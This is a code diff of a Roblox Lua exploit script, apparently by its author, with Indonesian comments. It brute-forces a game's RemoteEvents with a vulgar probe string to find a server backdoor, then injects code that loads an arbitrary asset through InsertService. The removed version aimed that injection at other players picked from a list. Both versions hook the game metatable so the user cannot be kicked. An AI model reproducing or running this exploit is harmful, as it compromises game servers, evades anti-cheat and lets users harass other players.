@@ -1,103 +1,65 @@
--- [[ SPTZYY ULTIMATE REMOTE INJECTOR ]] --
--- Logika: Remote Brute-Force + Asset Injection + Target List
+-- [[ SPTZYY BACKDOOR EXPLOIT - SOLO EXECUTION ]] --
+-- Fokus: Auto Brute-Force & Instant Execution (No List)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local lp = Players.LocalPlayer
 
--- Variabel Core dari Logika Kamu
+-- [[ VARIABEL LOGIKA INTI ]] --
 local modelName = "sptzyy"
 local zyy = nil
 local lastFired = nil
 local isScanning = false
+local assetID = 73729830375562
 
--- [[ ANTI-KICK BYPASS ]] --
+-- [[ 🛡️ ANTI-KICK BYPASS ]] --
 local mt = getrawmetatable(game)
 local old = mt.__namecall
 setreadonly(mt, false)
 mt.__namecall = newcclosure(function(self, ...)
-    if getnamecallmethod() == "Kick" then return nil end
+    if getnamecallmethod():lower() == "kick" then return nil end
     return old(self, ...)
 end)
 setreadonly(mt, true)
 
--- [[ UI SETUP ]] --
+-- [[ 🖥️ UI SETUP ]] --
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 350, 0, 420)
-MainFrame.Position = UDim2.new(0.5, -175, 0.5, -210)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.Size = UDim2.new(0, 280, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -140, 0.5, -90)
+MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 MainFrame.Visible = false
+MainFrame.Active = true
+MainFrame.Draggable = true -- Bisa digeser luas
 Instance.new("UICorner", MainFrame)
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Title.Text = "SPTZYY REMOTE EXPLOIT"
-Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title.Text = "SPTZYY BACKDOOR"
+Title.TextColor3 = Color3.fromRGB(0, 255, 150)
 Title.Font = Enum.Font.Code
 Instance.new("UICorner", Title)
 
--- Player Scrolling List
-local ScrollFrame = Instance.new("ScrollingFrame", MainFrame)
-ScrollFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
-ScrollFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
-ScrollFrame.BackgroundTransparency = 1
-ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScrollFrame.ScrollBarThickness = 2
-local UIList = Instance.new("UIListLayout", ScrollFrame)
-UIList.Padding = UDim.new(0, 5)
+local StatusBox = Instance.new("TextLabel", MainFrame)
+StatusBox.Size = UDim2.new(0.9, 0, 0, 60)
+StatusBox.Position = UDim2.new(0.05, 0, 0.3, 0)
+StatusBox.BackgroundColor3 = Color3.new(0, 0, 0)
+StatusBox.Text = "STATUS: READY"
+StatusBox.TextColor3 = Color3.new(1, 1, 0)
+StatusBox.Font = Enum.Font.Code
+StatusBox.TextSize = 12
+Instance.new("UICorner", StatusBox)
 
--- Status Log
-local StatusLabel = Instance.new("TextLabel", MainFrame)
-StatusLabel.Size = UDim2.new(0.9, 0, 0, 30)
-StatusLabel.Position = UDim2.new(0.05, 0, 0.78, 0)
-StatusLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-StatusLabel.Text = "Status: Menunggu Scan..."
-StatusLabel.TextColor3 = Color3.new(1, 1, 0)
-StatusLabel.TextSize = 10
-Instance.new("UICorner", StatusLabel)
+-- [[ ⚙️ CORE LOGIC ]] --
 
--- ==========================================
--- LOGIKA SCANNER (Disesuaikan dengan permintaanmu)
--- ==========================================
-workspace.ChildAdded:Connect(function(child)
-    if child.Name == modelName and zyy == nil then
-        zyy = lastFired
-        StatusLabel.Text = "VULNERABILITY FOUND: " .. tostring(zyy)
-        StatusLabel.TextColor3 = Color3.new(0, 1, 0)
-    end
-end)
-
-local function RunScan()
-    if isScanning then return end
-    isScanning = true
-    StatusLabel.Text = "Scanning Remotes... (Brute Force)"
-    
-    local payload = " KONTOL MESUM😂 " -- Pesan awal untuk trigger
-
-    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") then
-            pcall(function()
-                remote:FireServer(payload)
-            end)
-            lastFired = remote
-            RunService.RenderStepped:Wait()
-        end
-    end
-    isScanning = false
-end
-
--- ==========================================
--- LOGIKA INJECTION TARGET
--- ==========================================
-local function InjectToTarget(target)
+local function ExecutePayload()
     if zyy and typeof(zyy) == "Instance" then
-        StatusLabel.Text = "Injecting to: " .. target.Name
+        StatusBox.Text = "💉 EXECUTING PAYLOAD..."
         local insertPayload = [[
-            local player = game.Players:FindFirstChild("]] .. target.Name .. [[")
+            local player = game.Players:FindFirstChild("]] .. lp.Name .. [[")
             if player and player:FindFirstChild("PlayerGui") then
-                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
+                local asset = game:GetService("InsertService"):LoadAsset(]] .. assetID .. [[)
                 asset.Parent = player.PlayerGui
                 for _, child in ipairs(asset:GetChildren()) do
                     child.Parent = player.PlayerGui
@@ -105,50 +67,72 @@ local function InjectToTarget(target)
                 asset:Destroy()
             end
         ]]
-        zyy:FireServer(insertPayload)
-    else
-        StatusLabel.Text = "Gagal: Remote 'zyy' belum ditemukan!"
-        StatusLabel.TextColor3 = Color3.new(1, 0, 0)
-        RunScan() -- Coba scan ulang
+        pcall(function() zyy:FireServer(insertPayload) end)
     end
 end
 
--- ==========================================
--- UI CONTROLS
--- ==========================================
-local function RefreshList()
-    for _, c in pairs(ScrollFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
-    for _, p in pairs(Players:GetPlayers()) do
-        local b = Instance.new("TextButton", ScrollFrame)
-        b.Size = UDim2.new(1, 0, 0, 30)
-        b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        b.Text = p.Name
-        b.TextColor3 = Color3.new(1, 1, 1)
-        b.Font = Enum.Font.SourceSansBold
-        Instance.new("UICorner", b)
-        b.MouseButton1Click:Connect(function() InjectToTarget(p) end)
+workspace.ChildAdded:Connect(function(child)
+    if child.Name == modelName and zyy == nil then
+        zyy = lastFired
+        StatusBox.Text = "✅ BACKDOOR FOUND!\nEXECUTING..."
+        StatusBox.TextColor3 = Color3.new(0, 1, 0)
+        ExecutePayload()
     end
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 35)
+end)
+
+local function RunAutoScan()
+    if isScanning then return end
+    isScanning = true
+    StatusBox.Text = "🚀 BRUTING REMOTES..."
+    
+    for _, obj in ipairs(workspace:GetChildren()) do
+        if obj.Name == modelName then obj:Destroy() end
+    end
+
+    local payload = " KONTOL MESUM😂 "
+
+    task.spawn(function()
+        for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                pcall(function()
+                    remote:FireServer(payload)
+                end)
+                lastFired = remote
+                RunService.RenderStepped:Wait()
+            end
+        end
+        isScanning = false
+        if not zyy then
+            StatusBox.Text = "❌ NO VULNERABILITY\nRE-SCAN MANUALLY"
+            StatusBox.TextColor3 = Color3.new(1, 0, 0)
+        end
+    end)
 end
 
+-- Tombol Scan Manual
 local ScanBtn = Instance.new("TextButton", MainFrame)
-ScanBtn.Size = UDim2.new(0.9, 0, 0, 40)
-ScanBtn.Position = UDim2.new(0.05, 0, 0.88, 0)
-ScanBtn.Text = "RE-SCAN REMOTES"
-ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
+ScanBtn.Size = UDim2.new(0.9, 0, 0, 35)
+ScanBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
+ScanBtn.Text = "FORCE RE-SCAN"
+ScanBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
 ScanBtn.TextColor3 = Color3.new(1, 1, 1)
+ScanBtn.Font = Enum.Font.GothamBold
 Instance.new("UICorner", ScanBtn)
-ScanBtn.MouseButton1Click:Connect(RunScan)
+ScanBtn.MouseButton1Click:Connect(RunAutoScan)
 
 -- Icon Toggle
 local Icon = Instance.new("ImageButton", ScreenGui)
 Icon.Size = UDim2.new(0, 60, 0, 60)
 Icon.Position = UDim2.new(0.05, 0, 0.4, 0)
 Icon.Image = "rbxassetid://6031280227"
+Icon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 Icon.Draggable = true
 Icon.Active = true
 Instance.new("UICorner", Icon).CornerRadius = UDim.new(1, 0)
+
 Icon.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
-    if MainFrame.Visible then RefreshList() end
 end)
+
+-- Jalankan Scan Awal
+task.delay(1, RunAutoScan)
